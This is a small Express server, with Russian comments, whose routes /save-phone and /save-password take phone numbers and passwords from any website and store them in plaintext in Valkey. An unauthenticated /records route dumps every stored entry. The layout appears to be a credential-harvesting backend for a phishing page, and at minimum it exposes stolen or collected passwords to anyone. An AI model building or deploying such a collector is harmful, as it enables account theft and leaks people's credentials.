import express from "express";
import cors from "cors";
import { createClient } from "@valkey/client";

const app = express();
app.use(express.json());
app.use(cors());

// Подключение к Valkey (НЕ Redis)
const redis = createClient({
  url: process.env.REDIS_URL
});

redis.on("error", err => console.log("Valkey error:", err));

await redis.connect();

// Дозащитим ошибки
async function addRecord(record) {
  await redis.rPush("records", JSON.stringify(record));
}

async function getRecords() {
  const arr = await redis.lRange("records", 0, -1);
  return arr.map(x => JSON.parse(x));
}

// ===== ROUTES =====

app.post("/save-phone", async (req, res) => {
  try {
    await addRecord({
      type: "phone",
      ...req.body,
      time: new Date().toISOString()
    });
    res.json({ ok: true });
  } catch (e) {
    console.log(e);
    res.json({ ok: false });
  }
});

app.post("/save-password", async (req, res) => {
  try {
    await addRecord({
      type: "password",
      ...req.body,
      time: new Date().toISOString()
    });
    res.json({ ok: true });
  } catch (e) {
    console.log(e);
    res.json({ ok: false });
  }
});

app.get("/records", async (req, res) => {
  const records = await getRecords();
  res.json(records);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Backend running on " + PORT));
